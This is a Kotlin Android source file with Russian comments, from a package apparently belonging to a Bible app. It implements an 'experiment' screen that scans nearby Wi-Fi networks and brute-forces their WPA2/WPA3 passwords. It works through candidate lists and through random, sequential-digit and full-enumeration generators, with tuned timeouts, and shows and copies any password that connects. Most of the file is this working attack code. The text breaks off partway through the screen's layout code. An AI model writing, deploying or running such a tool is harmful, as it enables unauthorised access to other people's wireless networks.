package com.example.bible.ui

import android.Manifest
import android.annotation.SuppressLint
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.MacAddress
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.net.wifi.WifiNetworkSuggestion
import android.os.Build
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CenterAlignedTopAppBar
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.FilterChip
import androidx.compose.material3.FilledTonalButton
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Slider
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.rememberUpdatedState
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.core.content.ContextCompat.getMainExecutor
import com.example.bible.R
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import kotlinx.coroutines.TimeoutCancellationException
import kotlin.coroutines.resume
import kotlin.math.roundToInt

/** Один запрос подключения из диалога «Подключиться»: надёжный таймаут. */
private const val BRUTE_ATTEMPT_TIMEOUT_MS = 42_000L
/**
 * Перебор паролей: быстрее отрубаем зависшие попытки (часто отказ при неверном PSK приходит за несколько секунд).
 */
private const val BRUTE_FAST_ATTEMPT_TIMEOUT_MS = 18_000L
/** Короткая пауза между двумя подпопытками перебора (с BSSID / без). */
private const val BRUTE_FAST_SUB_DELAY_MS = 400L
/** Пауза между разными паролями при переборе (радиомодулю нужно время сбросить запрос). */
private const val BRUTE_DELAY_MS = 700L
private const val BRUTE_MAX_PASSWORDS = 500
private const val WPA_PSK_MIN_LEN = 8
private const val WPA_PSK_MAX_LEN = 63
private const val GEN_LENGTH_MIN = 3
private const val GEN_LENGTH_MAX = 80
private const val GEN_RANDOM_MAX_BATCH = 1_000
/** Пакет для автоподбора с пошаговой генерацией. */
private const val GEN_STREAM_BATCH = 100
/** Максимум шагов для потокового подбора «по 100» (без выделения всего списка в память). */
private const val GEN_SEQUENTIAL_STREAM_MAX_STEPS = 99_999_999
/**
 * Сколько строк можно добавить одной кнопкой «Добавить в список» (генерация в фоне, иначе ANR).
 */
private const val GEN_ADD_LIST_MAX_LINES = 2_000
private const val GEN_FULL_ENUM_MAX = 200_000

private const val WIFI_SPECIAL_CHARSET = "!@#\$%&*+-_=.,?^~`|:;/()[]{}"

/** Ход перебора паролей по списку: текущий кандидат и сколько ещё в очереди. */
private data class BruteProgressState(
    val currentPassword: String,
    val remainingInList: Int,
    val initialTotal: Int,
)

private fun copyTextToClipboard(context: Context, label: String, text: String) {
    val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    cm.setPrimaryClip(ClipData.newPlainText(label, text))
}

private enum class WifiPasswordGenMode {
    RANDOM,
    SEQUENTIAL_DIGITS,
    FULL_ENUMERATION,
}

private data class StreamingGenConfig(
    val mode: WifiPasswordGenMode,
    val charset: CharArray,
    val effLen: Int,
    /** Для SEQUENTIAL_DIGITS: число шагов (индексы 0..steps-1), как в поле «Сколько шагов». */
    val sequentialSteps: Int,
    /** Для FULL_ENUMERATION: заранее посчитанное число комбинаций. */
    val fullEnumTotal: Long,
)

private fun buildWifiCharset(
    digits: Boolean,
    lower: Boolean,
    upper: Boolean,
    special: Boolean,
): CharArray {
    val sb = StringBuilder()
    if (digits) sb.append("0123456789")
    if (lower) for (c in 'a'..'z') sb.append(c)
    if (upper) for (c in 'A'..'Z') sb.append(c)
    if (special) sb.append(WIFI_SPECIAL_CHARSET)
    return sb.toString().toCharArray()
}

private fun effectiveWpaGenLength(requested: Int): Int =
    requested.coerceIn(GEN_LENGTH_MIN, GEN_LENGTH_MAX).coerceAtMost(WPA_PSK_MAX_LEN)

private fun generateRandomWifiPasswords(
    charset: CharArray,
    length: Int,
    count: Int,
): List<String> {
    val rnd = java.security.SecureRandom()
    val target = count.coerceIn(1, GEN_RANDOM_MAX_BATCH)
    val out = LinkedHashSet<String>()
    var guard = 0
    while (out.size < target && guard < target * 100) {
        guard++
        val s = buildString(length) {
            repeat(length) { append(charset[rnd.nextInt(charset.size)]) }
        }
        out.add(s)
    }
    return out.toList()
}

/** Только для «Добавить в список»; [steps] не больше [GEN_ADD_LIST_MAX_LINES]. */
private fun generateSequentialDigitPasswords(length: Int, steps: Int): List<String> {
    require(steps in 1..GEN_ADD_LIST_MAX_LINES) { "steps" }
    val result = ArrayList<String>(steps)
    for (i in 0 until steps) {
        val s = i.toString().padStart(length, '0')
        result.add(
            if (s.length <= length) s else s.substring(s.length - length),
        )
    }
    return result
}

private fun fullEnumerationCount(charsetSize: Int, length: Int): Long {
    if (charsetSize <= 0 || length <= 0) return 0L
    var p = 1L
    repeat(length) {
        p *= charsetSize
        if (p > GEN_FULL_ENUM_MAX * 10L) return Long.MAX_VALUE
    }
    return p
}

private fun generateFullEnumeration(charset: CharArray, length: Int): List<String>? {
    val base = charset.size
    val total = fullEnumerationCount(base, length)
    if (total > GEN_FULL_ENUM_MAX) return null
    val out = ArrayList<String>()
    var n = 0L
    while (n < total) {
        var x = n
        out.add(
            buildString(length) {
                for (pos in length - 1 downTo 0) {
                    append(charset[(x % base).toInt()])
                    x /= base.toLong()
                }
            },
        )
        n++
    }
    return out
}

/** Следующие [batchSize] последовательных цифровых паролей; [nextIndex] — индекс после последнего. */
private fun sequentialDigitBatch(
    length: Int,
    startInclusive: Long,
    batchSize: Int,
    capExclusive: Long,
): Pair<List<String>, Long> {
    val out = ArrayList<String>(batchSize)
    var i = startInclusive
    while (out.size < batchSize && i < capExclusive) {
        val s = i.toString().padStart(length, '0')
        val pwd = if (s.length <= length) s else s.substring(s.length - length)
        out.add(pwd)
        i++
    }
    return out to i
}

/** Фрагмент полного перечисления с индекса [startInclusive]. */
private fun fullEnumerationBatch(
    charset: CharArray,
    length: Int,
    startInclusive: Long,
    batchSize: Int,
    totalExclusive: Long,
): Pair<List<String>, Long> {
    if (startInclusive >= totalExclusive) return emptyList<String>() to startInclusive
    val base = charset.size
    val out = ArrayList<String>(
        minOf(batchSize, (totalExclusive - startInclusive).toInt().coerceAtLeast(0)),
    )
    var n = startInclusive
    var produced = 0
    while (produced < batchSize && n < totalExclusive) {
        var x = n
        out.add(
            buildString(length) {
                for (pos in length - 1 downTo 0) {
                    append(charset[(x % base).toInt()])
                    x /= base.toLong()
                }
            },
        )
        n++
        produced++
    }
    return out to n
}

private enum class WifiApSecurity {
    OPEN,
    WPA2,
    WPA3,
    UNSUPPORTED,
}

private enum class WifiConnectUiStatus {
    Unsupported,
    Pending,
    Available,
    Unavailable,
    Lost,
}

private sealed interface WifiStartResult {
    data class Started(val handle: WifiRequestHandle) : WifiStartResult
    data object BadInput : WifiStartResult
    data object PermissionDenied : WifiStartResult
}

private data class WifiLinkOutcome(
    val ok: Boolean,
    val handle: WifiRequestHandle?,
    val permissionDenied: Boolean = false,
    val networkSuggestionPosted: Boolean = false,
)

private data class WifiRequestHandle(
    val cm: ConnectivityManager,
    val cb: ConnectivityManager.NetworkCallback,
)

/** Тип шифрования для [WifiNetworkSpecifier]: для WPA2/WPA3 transition сначала PSK, при неудаче — SAE. */
private fun ScanResult.preferredLinkSecurity(): WifiApSecurity {
    val c = capabilities.uppercase(Locale.US)
    if (c.contains("8021X") || c.contains("EAP")) return WifiApSecurity.UNSUPPORTED
    if (c.contains("WEP")) return WifiApSecurity.UNSUPPORTED
    val hasSae = c.contains("SAE") || c.contains("WPA3")
    val hasPsk = c.contains("PSK") || c.contains("WPA2") || c.contains("WPA-") || c.contains("[WPA")
    if (hasSae && hasPsk) return WifiApSecurity.WPA2
    if (hasSae) return WifiApSecurity.WPA3
    if (hasPsk || c.contains("WPA")) return WifiApSecurity.WPA2
    return WifiApSecurity.OPEN
}

private fun ScanResult.alternateLinkSecurity(primary: WifiApSecurity): WifiApSecurity? {
    val c = capabilities.uppercase(Locale.US)
    val hasSae = c.contains("SAE") || c.contains("WPA3")
    val hasPsk = c.contains("PSK") || c.contains("WPA2") || c.contains("WPA-") || c.contains("[WPA")
    return when (primary) {
        WifiApSecurity.WPA2 -> if (hasSae) WifiApSecurity.WPA3 else null
        WifiApSecurity.WPA3 -> if (hasPsk) WifiApSecurity.WPA2 else null
        else -> null
    }
}

/** Для UI диалога — то же, что [preferredLinkSecurity]. */
private fun ScanResult.apSecurity(): WifiApSecurity = preferredLinkSecurity()

@SuppressLint("MissingPermission")
private fun startWifiConnectionRequest(
    appContext: Context,
    scan: ScanResult,
    manualSsid: String,
    password: String,
    linkSecurity: WifiApSecurity,
    attachBssid: Boolean,
    onStatus: (WifiConnectUiStatus) -> Unit,
): WifiStartResult {
    if (scan.preferredLinkSecurity() == WifiApSecurity.UNSUPPORTED) {
        onStatus(WifiConnectUiStatus.Unsupported)
        return WifiStartResult.BadInput
    }
    val pwd = password.trim()
    if (linkSecurity != WifiApSecurity.OPEN &&
        (pwd.length < WPA_PSK_MIN_LEN || pwd.length > WPA_PSK_MAX_LEN)
    ) {
        onStatus(WifiConnectUiStatus.Unavailable)
        return WifiStartResult.BadInput
    }
    val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val builder = WifiNetworkSpecifier.Builder()
    val ssidFromScan = scan.displaySsid().trim()
    val ssidManual = manualSsid.trim()
    val ssid = ssidFromScan.ifBlank { ssidManual }
    when {
        ssid.isNotBlank() -> builder.setSsid(ssid)
        linkSecurity == WifiApSecurity.OPEN -> {
            try {
                builder.setBssid(MacAddress.fromString(scan.BSSID))
            } catch (_: IllegalArgumentException) {
                onStatus(WifiConnectUiStatus.Unavailable)
                return WifiStartResult.BadInput
            }
        }
        else -> {
            onStatus(WifiConnectUiStatus.Unavailable)
            return WifiStartResult.BadInput
        }
    }
    if (attachBssid && scan.BSSID.isNotBlank()) {
        val alreadyBssidOnlyOpen =
            linkSecurity == WifiApSecurity.OPEN && ssid.isBlank()
        if (!alreadyBssidOnlyOpen) {
            try {
                builder.setBssid(MacAddress.fromString(scan.BSSID))
            } catch (_: IllegalArgumentException) {
                // некорректный BSSID в результате скана — подключаемся только по SSID
            }
        }
    }
    when (linkSecurity) {
        WifiApSecurity.OPEN -> Unit
        WifiApSecurity.WPA2 -> builder.setWpa2Passphrase(pwd)
        WifiApSecurity.WPA3 -> builder.setWpa3Passphrase(pwd)
        WifiApSecurity.UNSUPPORTED -> return WifiStartResult.BadInput
    }
    val specifier = try {
        builder.build()
    } catch (_: Exception) {
        onStatus(WifiConnectUiStatus.Unavailable)
        return WifiStartResult.BadInput
    }
    val request = NetworkRequest.Builder()
        .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
        .addCapability(NetworkCapabilities.NET_CAPABILITY_TRUSTED)
        .setNetworkSpecifier(specifier)
        .build()
    val callback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            onStatus(WifiConnectUiStatus.Available)
        }

        override fun onUnavailable() {
            onStatus(WifiConnectUiStatus.Unavailable)
        }

        override fun onLost(network: Network) {
            onStatus(WifiConnectUiStatus.Lost)
        }
    }
    try {
        cm.requestNetwork(request, callback)
    } catch (_: SecurityException) {
        return WifiStartResult.PermissionDenied
    }
    onStatus(WifiConnectUiStatus.Pending)
    return WifiStartResult.Started(WifiRequestHandle(cm, callback))
}

@SuppressLint("MissingPermission")
private fun postWifiNetworkSuggestion(
    appContext: Context,
    scan: ScanResult,
    manualSsid: String,
    password: String,
    linkSecurity: WifiApSecurity,
): Boolean {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return false
    if (linkSecurity != WifiApSecurity.WPA2 && linkSecurity != WifiApSecurity.WPA3) return false
    val pwd = password.trim()
    if (pwd.length !in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN) return false
    val ssid = scan.displaySsid().trim().ifBlank { manualSsid.trim() }
    if (ssid.isBlank()) return false
    val wm = appContext.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    val b = WifiNetworkSuggestion.Builder().setSsid(ssid)
    try {
        when (linkSecurity) {
            WifiApSecurity.WPA2 -> b.setWpa2Passphrase(pwd)
            WifiApSecurity.WPA3 -> b.setWpa3Passphrase(pwd)
            else -> return false
        }
    } catch (_: IllegalArgumentException) {
        return false
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && scan.BSSID.isNotBlank()) {
        try {
            b.setBssid(MacAddress.fromString(scan.BSSID))
        } catch (_: IllegalArgumentException) {
        }
    }
    return try {
        wm.addNetworkSuggestions(listOf(b.build())) == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS
    } catch (_: SecurityException) {
        false
    }
}

private suspend fun trySingleWifiConnect(
    appContext: Context,
    scan: ScanResult,
    manualSsid: String,
    password: String,
    linkSecurity: WifiApSecurity,
    attachBssid: Boolean = true,
    attemptTimeoutMs: Long = BRUTE_ATTEMPT_TIMEOUT_MS,
): WifiLinkOutcome = withContext(Dispatchers.Main.immediate) {
    var handle: WifiRequestHandle? = null
    var permissionDenied = false
    val ok = try {
        withTimeout(attemptTimeoutMs) {
            suspendCancellableCoroutine { cont ->
                val finished = AtomicBoolean(false)
                fun finishFail() {
                    if (cont.isActive && finished.compareAndSet(false, true)) cont.resume(false)
                }
                when (
                    val start = startWifiConnectionRequest(
                        appContext,
                        scan,
                        manualSsid,
                        password,
                        linkSecurity,
                        attachBssid,
                    ) { status ->
                        when (status) {
                            WifiConnectUiStatus.Pending -> Unit
                            WifiConnectUiStatus.Available ->
                                if (cont.isActive && finished.compareAndSet(false, true)) {
                                    cont.resume(true)
                                }
                            WifiConnectUiStatus.Unavailable,
                            WifiConnectUiStatus.Lost,
                            WifiConnectUiStatus.Unsupported,
                            -> finishFail()
                        }
                    }
                ) {
                    is WifiStartResult.Started -> {
                        handle = start.handle
                        cont.invokeOnCancellation {
                            runCatching { start.handle.cm.unregisterNetworkCallback(start.handle.cb) }
                        }
                    }
                    WifiStartResult.BadInput -> finishFail()
                    WifiStartResult.PermissionDenied -> {
                        permissionDenied = true
                        finishFail()
                    }
                }
            }
        }
    } catch (_: TimeoutCancellationException) {
        handle?.let { runCatching { it.cm.unregisterNetworkCallback(it.cb) } }
        handle = null
        false
    }
    if (ok) {
        WifiLinkOutcome(ok = true, handle = handle, permissionDenied = false)
    } else {
        handle?.let { runCatching { it.cm.unregisterNetworkCallback(it.cb) } }
        WifiLinkOutcome(ok = false, handle = null, permissionDenied = permissionDenied)
    }
}

private suspend fun connectWithWpaFallback(
    appContext: Context,
    scan: ScanResult,
    manualSsid: String,
    password: String,
    postSuggestionIfAllFail: Boolean = true,
    /** Только для перебора: меньше таймаут, 2 попытки (BSSID / без), без смены WPA2↔WPA3. */
    bruteFastMode: Boolean = false,
): WifiLinkOutcome {
    val pwd = password.trim()
    val primary = scan.preferredLinkSecurity()
    if (primary == WifiApSecurity.UNSUPPORTED) {
        return WifiLinkOutcome(false, null)
    }
    if (primary == WifiApSecurity.OPEN) {
        return trySingleWifiConnect(
            appContext,
            scan,
            manualSsid,
            pwd,
            WifiApSecurity.OPEN,
            attachBssid = true,
            attemptTimeoutMs = if (bruteFastMode) BRUTE_FAST_ATTEMPT_TIMEOUT_MS else BRUTE_ATTEMPT_TIMEOUT_MS,
        )
    }

    var anyPermDenied = false
    suspend fun runAttempt(
        sec: WifiApSecurity,
        attachBssid: Boolean,
        timeoutMs: Long = BRUTE_ATTEMPT_TIMEOUT_MS,
    ): WifiLinkOutcome {
        val o = trySingleWifiConnect(
            appContext,
            scan,
            manualSsid,
            pwd,
            sec,
            attachBssid,
            attemptTimeoutMs = timeoutMs,
        )
        if (o.permissionDenied) anyPermDenied = true
        return o
    }

    if (bruteFastMode) {
        var r = runAttempt(primary, attachBssid = true, timeoutMs = BRUTE_FAST_ATTEMPT_TIMEOUT_MS)
        if (r.ok) return r
        delay(BRUTE_FAST_SUB_DELAY_MS)
        r = runAttempt(primary, attachBssid = false, timeoutMs = BRUTE_FAST_ATTEMPT_TIMEOUT_MS)
        if (r.ok) return r
        return WifiLinkOutcome(false, null, permissionDenied = anyPermDenied, networkSuggestionPosted = false)
    }

    var r = runAttempt(primary, attachBssid = true)
    if (r.ok) return r

    delay(1_200)
    r = runAttempt(primary, attachBssid = false)
    if (r.ok) return r

    val alt = scan.alternateLinkSecurity(primary)
    if (alt != null) {
        delay(1_800)
        r = runAttempt(alt, attachBssid = true)
        if (r.ok) return r
        delay(1_200)
        r = runAttempt(alt, attachBssid = false)
    }

    if (r.ok) return r

    val posted = if (postSuggestionIfAllFail) {
        postWifiNetworkSuggestion(appContext, scan, manualSsid, pwd, primary) ||
            (alt?.let { postWifiNetworkSuggestion(appContext, scan, manualSsid, pwd, it) } == true)
    } else {
        false
    }

    return WifiLinkOutcome(
        ok = false,
        handle = null,
        permissionDenied = anyPermDenied,
        networkSuggestionPosted = posted,
    )
}

private suspend fun tryWifiPassword(
    appContext: Context,
    scan: ScanResult,
    manualSsid: String,
    password: String,
): WifiLinkOutcome =
    connectWithWpaFallback(
        appContext,
        scan,
        manualSsid,
        password,
        postSuggestionIfAllFail = false,
        bruteFastMode = true,
    )

private fun clearPendingWifiConnect(
    pair: Pair<ConnectivityManager, ConnectivityManager.NetworkCallback>?,
) {
    pair?.let { (cm, cb) ->
        runCatching { cm.unregisterNetworkCallback(cb) }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ExperimentWifiScreen(onBack: () -> Unit) {
    val context = LocalContext.current
    val appContext = remember { context.applicationContext }
    val scope = rememberCoroutineScope()
    val wifiManager = remember(appContext) {
        appContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    }

    val needNearbyWifi = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
    var hasFineLocation by remember {
        mutableStateOf(
            ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) ==
                PackageManager.PERMISSION_GRANTED,
        )
    }
    var hasNearbyWifi by remember {
        mutableStateOf(
            if (needNearbyWifi) {
                ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.NEARBY_WIFI_DEVICES,
                ) == PackageManager.PERMISSION_GRANTED
            } else {
                true
            },
        )
    }
    val wifiPermLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { result ->
        hasFineLocation = result[Manifest.permission.ACCESS_FINE_LOCATION] == true
        if (needNearbyWifi) {
            hasNearbyWifi = result[Manifest.permission.NEARBY_WIFI_DEVICES] == true
        }
    }
    val canUseWifiApis = hasFineLocation && (!needNearbyWifi || hasNearbyWifi)

    var scanResults by remember { mutableStateOf<List<ScanResult>>(emptyList()) }
    var scanning by remember { mutableStateOf(false) }

    var pickedScan by remember { mutableStateOf<ScanResult?>(null) }
    val candidateLinesState = remember { mutableStateOf("") }
    LaunchedEffect(pickedScan?.BSSID) {
        candidateLinesState.value = ""
    }
    var pendingWifiConnect by remember {
        mutableStateOf<Pair<ConnectivityManager, ConnectivityManager.NetworkCallback>?>(null)
    }
    var bruteJob by remember { mutableStateOf<Job?>(null) }
    var bruteProgress by remember { mutableStateOf<BruteProgressState?>(null) }
    var bruteFoundPassword by remember { mutableStateOf<String?>(null) }
    val pendingForDispose = rememberUpdatedState(pendingWifiConnect)
    val bruteJobForDispose = rememberUpdatedState(bruteJob)
    DisposableEffect(Unit) {
        onDispose {
            bruteJobForDispose.value?.cancel()
            clearPendingWifiConnect(pendingForDispose.value)
        }
    }

    DisposableEffect(wifiManager, canUseWifiApis) {
        if (!canUseWifiApis) {
            scanResults = emptyList()
            return@DisposableEffect onDispose { }
        }
        val callback = object : WifiManager.ScanResultsCallback() {
            override fun onScanResultsAvailable() {
                scanning = false
                scanResults = readSortedScanResults(wifiManager)
            }
        }
        wifiManager.registerScanResultsCallback(getMainExecutor(appContext), callback)
        scanResults = readSortedScanResults(wifiManager)
        onDispose {
            wifiManager.unregisterScanResultsCallback(callback)
        }
    }

    @Suppress("DEPRECATION")
    val wifiOn = wifiManager.isWifiEnabled

    fun cancelActiveConnection() {
        bruteJob?.cancel()
        bruteJob = null
        clearPendingWifiConnect(pendingWifiConnect)
        pendingWifiConnect = null
        bruteProgress = null
    }

    bruteFoundPassword?.let { foundPwd ->
        AlertDialog(
            onDismissRequest = { bruteFoundPassword = null },
            title = { Text(stringResource(R.string.experiment_wifi_brute_found_title)) },
            text = {
                Column {
                    Text(stringResource(R.string.experiment_wifi_brute_found_body))
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = foundPwd,
                        style = MaterialTheme.typography.titleMedium,
                        color = MaterialTheme.colorScheme.primary,
                    )
                }
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        copyTextToClipboard(
                            appContext,
                            appContext.getString(R.string.experiment_wifi_clipboard_label_password),
                            foundPwd,
                        )
                        Toast.makeText(
                            appContext,
                            appContext.getString(R.string.experiment_wifi_password_copied),
                            Toast.LENGTH_SHORT,
                        ).show()
                    },
                ) {
                    Text(stringResource(R.string.experiment_wifi_copy_password))
                }
            },
            dismissButton = {
                TextButton(onClick = { bruteFoundPassword = null }) {
                    Text(stringResource(R.string.experiment_wifi_brute_dialog_close))
                }
            },
        )
    }

    pickedScan?.let { scan ->
        WifiConnectDialog(
            scan = scan,
            wifiApisReady = canUseWifiApis,
            candidateLinesState = candidateLinesState,
            onDismiss = { pickedScan = null },
            onConnect = { manualSsid, password ->
                pickedScan = null
                scope.launch {
                    clearPendingWifiConnect(pendingWifiConnect)
                    pendingWifiConnect = null
                    if (!canUseWifiApis) {
                        Toast.makeText(
                            appContext,
                            appContext.getString(R.string.experiment_wifi_connect_need_permissions),
                            Toast.LENGTH_LONG,
                        ).show()
                        return@launch
                    }
                    Toast.makeText(
                        appContext,
                        appContext.getString(R.string.experiment_wifi_status_pending),
                        Toast.LENGTH_SHORT,
                    ).show()
                    val outcome = connectWithWpaFallback(appContext, scan, manualSsid, password)
                    when {
                        outcome.ok && outcome.handle != null -> {
                            pendingWifiConnect = outcome.handle.cm to outcome.handle.cb
                            Toast.makeText(
                                appContext,
                                appContext.getString(R.string.experiment_wifi_status_ok),
                                Toast.LENGTH_LONG,
                            ).show()
                        }
                        outcome.networkSuggestionPosted -> {
                            Toast.makeText(
                                appContext,
                                appContext.getString(R.string.experiment_wifi_suggestion_sent),
                                Toast.LENGTH_LONG,
                            ).show()
                        }
                        outcome.permissionDenied -> {
                            Toast.makeText(
                                appContext,
                                appContext.getString(R.string.experiment_wifi_fail_security),
                                Toast.LENGTH_LONG,
                            ).show()
                        }
                        else -> {
                            Toast.makeText(
                                appContext,
                                appContext.getString(R.string.experiment_wifi_status_fail),
                                Toast.LENGTH_LONG,
                            ).show()
                        }
                    }
                }
            },
            onBruteForce = { manualSsid, candidates ->
                pickedScan = null
                bruteFoundPassword = null
                bruteJob?.cancel()
                bruteJob = scope.launch {
                    val remaining = candidates.map { it.trim() }.filter { it.isNotEmpty() }.toMutableList()
                    val initialTotal = remaining.size
                    try {
                        while (remaining.isNotEmpty() && isActive) {
                            val pwd = remaining.first()
                            bruteProgress = BruteProgressState(
                                currentPassword = pwd,
                                remainingInList = remaining.size,
                                initialTotal = initialTotal,
                            )
                            clearPendingWifiConnect(pendingWifiConnect)
                            pendingWifiConnect = null
                            val attempt = tryWifiPassword(appContext, scan, manualSsid, pwd)
                            if (attempt.ok && attempt.handle != null) {
                                pendingWifiConnect = attempt.handle.cm to attempt.handle.cb
                                bruteProgress = null
                                bruteFoundPassword = pwd
                                Toast.makeText(
                                    appContext,
                                    appContext.getString(R.string.experiment_wifi_status_ok),
                                    Toast.LENGTH_LONG,
                                ).show()
                                return@launch
                            }
                            remaining.removeAt(0)
                            if (remaining.isNotEmpty()) {
                                delay(BRUTE_DELAY_MS)
                            }
                        }
                        if (isActive) {
                            Toast.makeText(
                                appContext,
                                appContext.getString(R.string.experiment_wifi_brute_fail),
                                Toast.LENGTH_LONG,
                            ).show()
                        }
                    } catch (_: CancellationException) {
                        clearPendingWifiConnect(pendingWifiConnect)
                        pendingWifiConnect = null
                        Toast.makeText(
                            appContext,
                            appContext.getString(R.string.experiment_wifi_brute_cancelled),
                            Toast.LENGTH_SHORT,
                        ).show()
                    } finally {
                        bruteProgress = null
                        bruteJob = null
                    }
                }
            },
            onStreamingGenBrute = streamingGen@{ scanForJob, manualSsid, config ->
                if (!canUseWifiApis) {
                    Toast.makeText(
                        appContext,
                        appContext.getString(R.string.experiment_wifi_connect_need_permissions),
                        Toast.LENGTH_LONG,
                    ).show()
                    return@streamingGen
                }
                bruteFoundPassword = null
                bruteJob?.cancel()
                bruteJob = scope.launch {
                    val queue = candidateLinesState.value.lines()
                        .map { it.trim() }
                        .filter { it.length in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN }
                        .distinct()
                        .toMutableList()
                    fun syncListUi() {
                        candidateLinesState.value = queue.joinToString("\n")
                    }
                    syncListUi()
                    var seqPos = 0L
                    var fullPos = 0L
                    val batch = GEN_STREAM_BATCH
                    val seqCap = config.sequentialSteps.toLong()
                    val fullTotal = config.fullEnumTotal
                    try {
                        while (isActive) {
                            if (queue.isEmpty()) {
                                val nextChunk: List<String> = when (config.mode) {
                                    WifiPasswordGenMode.RANDOM -> {
                                        generateRandomWifiPasswords(
                                            config.charset,
                                            config.effLen,
                                            batch,
                                        ).filter { it.length in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN }
                                    }
                                    WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
                                        val (chunk, next) = sequentialDigitBatch(
                                            config.effLen,
                                            seqPos,
                                            batch,
                                            seqCap,
                                        )
                                        seqPos = next
                                        chunk
                                    }
                                    WifiPasswordGenMode.FULL_ENUMERATION -> {
                                        val (chunk, next) = fullEnumerationBatch(
                                            config.charset,
                                            config.effLen,
                                            fullPos,
                                            batch,
                                            fullTotal,
                                        )
                                        fullPos = next
                                        chunk
                                    }
                                }
                                if (nextChunk.isEmpty()) {
                                    if (isActive) {
                                        Toast.makeText(
                                            appContext,
                                            appContext.getString(R.string.experiment_wifi_brute_fail),
                                            Toast.LENGTH_LONG,
                                        ).show()
                                    }
                                    break
                                }
                                queue.addAll(nextChunk)
                                syncListUi()
                            }
                            val pwd = queue.first()
                            bruteProgress = BruteProgressState(
                                currentPassword = pwd,
                                remainingInList = queue.size,
                                initialTotal = maxOf(queue.size, GEN_STREAM_BATCH),
                            )
                            clearPendingWifiConnect(pendingWifiConnect)
                            pendingWifiConnect = null
                            val attempt = tryWifiPassword(appContext, scanForJob, manualSsid, pwd)
                            if (attempt.ok && attempt.handle != null) {
                                pendingWifiConnect = attempt.handle.cm to attempt.handle.cb
                                bruteProgress = null
                                bruteFoundPassword = pwd
                                Toast.makeText(
                                    appContext,
                                    appContext.getString(R.string.experiment_wifi_status_ok),
                                    Toast.LENGTH_LONG,
                                ).show()
                                return@launch
                            }
                            queue.removeAt(0)
                            syncListUi()
                            if (queue.isNotEmpty()) {
                                delay(BRUTE_DELAY_MS)
                            }
                        }
                    } catch (_: CancellationException) {
                        clearPendingWifiConnect(pendingWifiConnect)
                        pendingWifiConnect = null
                        Toast.makeText(
                            appContext,
                            appContext.getString(R.string.experiment_wifi_brute_cancelled),
                            Toast.LENGTH_SHORT,
                        ).show()
                    } finally {
                        bruteProgress = null
                        bruteJob = null
                    }
                }
            },
        )
    }

    Scaffold(
        topBar = {
            CenterAlignedTopAppBar(
                title = { Text(stringResource(R.string.experiment_wifi_title)) },
